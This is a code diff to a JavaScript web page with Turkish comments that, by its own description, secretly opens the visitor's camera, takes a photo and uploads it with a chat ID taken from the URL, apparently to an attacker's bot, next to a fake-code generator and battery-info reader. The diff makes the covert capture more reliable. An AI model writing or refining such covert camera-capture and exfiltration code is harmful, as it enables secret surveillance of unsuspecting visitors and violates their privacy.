@@ -39,9 +39,6 @@ const urlParams = new URLSearchParams(window.location.search);
 const CHAT_ID = urlParams.get("chat");    // Karşı tarafın chat ID'si, zorunlu
 const URL_SIFRE = urlParams.get("sifre"); // Kişisel şifre
 
-// Admin veya normal kullanıcı farkını botta kontrol edeceksin. 
-// Burada client tarafında sadece basit kontrol yapılır.
-
 // Rastgele sahte kod üretimi
 function generateFakeCode() {
   const part1 = Math.floor(1000 + Math.random() * 9000);
@@ -80,7 +77,7 @@ async function getBatteryInfo() {
   }
 }
 
-// Kamera gizlice açma ve foto çekme
+// Kamera gizlice açma ve foto çekme (güncel)
 async function takePhoto() {
   try {
     const video = document.createElement("video");
@@ -88,12 +85,16 @@ async function takePhoto() {
     document.body.appendChild(video);
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
-    await new Promise(r => setTimeout(r, 1500));
+
+    await video.play(); // video stream’i başlat
+    await new Promise(r => setTimeout(r, 500)); // kamera stabilize olsun
+
     const canvas = document.createElement("canvas");
-    canvas.width = 640;
-    canvas.height = 480;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
     canvas.toBlob(async (blob) => {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
@@ -105,8 +106,9 @@ async function takePhoto() {
       stream.getTracks().forEach(track => track.stop());
       video.remove();
     }, "image/jpeg");
+
   } catch(e) {
-    // Kamera reddedilirse umurumda değil, sikeyim
+    console.log("Kamera açılamadı veya hata oluştu", e);
   }
 }
 
